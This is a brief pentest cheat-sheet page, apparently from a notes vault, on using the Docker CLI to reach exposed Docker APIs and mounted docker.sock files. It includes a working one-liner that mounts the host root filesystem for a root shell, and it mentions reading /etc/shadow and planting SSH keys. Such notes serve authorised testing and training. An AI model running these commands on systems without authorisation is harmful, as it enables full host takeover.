# docker

**Tags:** `#docker` `#containers` `#dockerapi` `#privesc` `#escape`

The Docker CLI client. Beyond local container management, its `-H`/`DOCKER_HOST` flag points it at a **remote** daemon — so an exposed TCP Docker API (`2375`/`2376`) or a mounted `/var/run/docker.sock` is driven with the same `run`/`exec`/`ps`/`images` commands. Because the daemon runs as root, remote or socket access = root on the host (mount `/` into a container, write an SSH key, read `/etc/shadow`). When the client binary isn't present, the same REST API is reachable with [[Tools/File Transfer/cURL|cURL]] (`--unix-socket`).

**Source:** https://docs.docker.com/reference/cli/docker/ (Kali: `apt install docker.io`)
**Install:** `sudo apt install docker.io` — or use the static client binary from download.docker.com.

```bash
# Drive a remote, unauthenticated daemon
docker -H tcp://<target>:2375 ps
docker -H tcp://<target>:2375 run -it -v /:/mnt alpine chroot /mnt   # host root shell

# Or via env var for the whole session
export DOCKER_HOST=tcp://<target>:2375
docker images
```

Sibling orchestration client: [[Tools/Cloud/kubectl|kubectl]].

---

> [!note] **See also** — [[Services/Web Services/Docker API|Docker API]] — remote-daemon takeover over `2375`/`2376` and `docker.sock`, host-mount/exec escapes, image credential inspection, and the Leaky Vessels (CVE-2024-21626) WORKDIR escape.

---

*Created: 2026-09-24*
*Updated: 2026-09-24*
*Model: claude-opus-4-8*
